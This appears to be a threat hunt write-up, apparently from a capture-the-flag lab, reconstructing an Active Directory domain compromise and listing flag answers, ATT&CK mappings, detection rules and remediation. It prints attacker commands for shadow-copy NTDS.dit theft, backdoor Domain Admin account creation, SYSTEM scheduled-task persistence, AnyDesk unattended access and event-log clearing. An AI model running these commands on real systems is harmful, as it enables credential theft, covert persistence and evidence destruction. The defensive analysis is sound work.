# 🛡️ Threat Hunt Report: Domain Compromise & Persistence Analysis

## 📌 Overview

This threat hunt investigates a full-scale **Active Directory domain compromise** involving credential theft, privilege escalation, persistence mechanisms, remote access tooling, and anti-forensics activity.

The attacker demonstrated disciplined tradecraft, leveraging built-in tools and legitimate software to blend into the environment while maintaining long-term access.

---

## 🎯 Objectives

* Identify attacker entry behavior and intent
* Trace credential access and domain compromise
* Detect persistence mechanisms
* Analyze anti-forensics techniques
* Assess impact and recovery risk

---

## 🧬 Attack Timeline (Reconstructed)

| Time | Event                | Description                            |
| ---- | -------------------- | -------------------------------------- |
| T1   | Initial Access       | Attacker lands on Domain Controller    |
| T2   | Recon                | `whoami` executed                      |
| T3   | Shadow Copy          | `vssadmin` used to access NTDS         |
| T4   | Credential Dump      | NTDS.dit accessed                      |
| T5   | Persistence          | Backdoor account created               |
| T6   | Privilege Escalation | Added to Domain Admins                 |
| T7   | Credential Exposure  | Plaintext credentials used in commands |
| T8   | Lateral Tool Access  | Network share mapped                   |
| T9   | Scheduled Task       | Persistence via `schtasks`             |
| T10  | Remote Access        | AnyDesk installed                      |
| T11  | Config Modification  | AnyDesk unattended access enabled      |
| T12  | Anti-Forensics       | Event logs cleared                     |

---

## 🚨 Key Findings (Flags)

| Flag | Category                 | Answer                               |
| ---- | ------------------------ | ------------------------------------ |
| Q35  | DC Arrival & Shadow Tool | `whoami > vssadmin.exe`              |
| Q36  | Backdoor Account         | `svc_backup`                         |
| Q37  | Backdoor Credential      | `P@ssw0rd123!`                       |
| Q38  | Privilege Assignment     | `Domain Admins`                      |
| Q39  | Exposed Credential       | `EmberForge2024!`                    |
| Q40  | Scheduled Task           | `WindowsUpdate`                      |
| Q41  | Remote Access Tool       | `AnyDesk`                            |
| Q42  | Config File Path         | `C:\ProgramData\AnyDesk\system.conf` |
| Q43  | Anti-Forensics Tool      | `wevtutil.exe`                       |
| Q44  | Cleared Logs             | `Security, System`                   |

---

## ⚔️ Attack Chain Analysis

### 1. Initial Reconnaissance

```bash
whoami
```

* Confirms privilege level on DC

---

### 2. Credential Access via Shadow Copy

```bash
vssadmin list shadows
vssadmin create shadow /For=C:
```

* Enables access to locked NTDS.dit

---

### 3. NTDS Extraction

```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy...\ntds.dit
```

* Full domain credential compromise

---

### 4. Backdoor Account Creation

```bash
net user svc_backup P@ssw0rd123! /add /domain
```

---

### 5. Privilege Escalation

```bash
net group "Domain Admins" svc_backup /add /domain
```

---

### 6. Credential Exposure (Operational Failure)

```bash
net use Z: \\10.1.173.145\tools /user:EMBERFORGE\Administrator EmberForge2024!
```

---

### 7. Persistence via Scheduled Task

```bash
schtasks /create /tn WindowsUpdate /tr C:\Users\Public\update.exe /sc onstart /ru system
```

---

### 8. Remote Access Installation

* Tool: **AnyDesk**
* Installed silently for unattended access

---

### 9. Configuration Manipulation

```bash
C:\ProgramData\AnyDesk\system.conf
```

Modified settings:

```text
ad.security.interactive_access=2
ad.security.unattended_access_password_hash=...
```

---

### 10. Anti-Forensics

```bash
wevtutil cl Security
wevtutil cl System
```

* Attempt to destroy evidence
* Created investigative blind spots

---

## 🧬 MITRE ATT&CK Mapping

| Tactic               | Technique              | ID        |
| -------------------- | ---------------------- | --------- |
| Initial Access       | Valid Accounts         | T1078     |
| Execution            | Command Shell          | T1059     |
| Credential Access    | NTDS Dump              | T1003.003 |
| Persistence          | Account Creation       | T1136     |
| Privilege Escalation | Account Manipulation   | T1098     |
| Lateral Movement     | SMB/Net Use            | T1021     |
| Persistence          | Scheduled Task         | T1053.005 |
| C2                   | Remote Access Software | T1219     |
| Defense Evasion      | Clear Logs             | T1070.001 |
| Persistence          | Config Modification    | T1546     |

---

## 🔥 Impact Assessment

### 🚨 Severity: CRITICAL

* Full Domain Admin compromise
* Persistent access mechanisms in place
* Multiple credential exposures
* Remote access maintained post-compromise
* Evidence tampering confirmed

---

## 🧠 CISO Question: "Are we safe after reset?"

### ❌ Answer: NO

### Reasons:

* Backdoor account remains
* Scheduled task persists
* AnyDesk provides remote access
* Config allows unattended control
* Logs were wiped → incomplete visibility

---

## 🛠️ Recommendations

### Immediate Actions

* Disable and remove `svc_backup`
* Reset ALL domain credentials
* Remove AnyDesk and validate endpoints
* Delete malicious scheduled tasks
* Rebuild Domain Controller if necessary

---

### Detection Improvements

* Alert on:

  * `net user /add`
  * `net group "Domain Admins"`
  * `wevtutil`
  * `schtasks /create`
* Monitor:

  * `C:\Users\Public\`
  * `ProgramData\AnyDesk`
* Enable centralized logging (SIEM)

---

### Hardening

* Restrict Domain Admin usage
* Implement LAPS
* Enforce MFA for admin accounts
* Deploy EDR across all endpoints

---

## 🧾 Lessons Learned

* Attackers blend in with legitimate tools
* Plaintext credentials remain a major weakness
* Logging gaps can severely limit investigations
* Persistence is layered—not singular

---

## 🧠 Final Thought

> This wasn’t a smash-and-grab.
> This was occupation.

The attacker didn’t just break in—they ensured they could return anytime, silently.

---

## 📂 Author

**Grisham D**
Security+ Certified | Threat Hunter

---
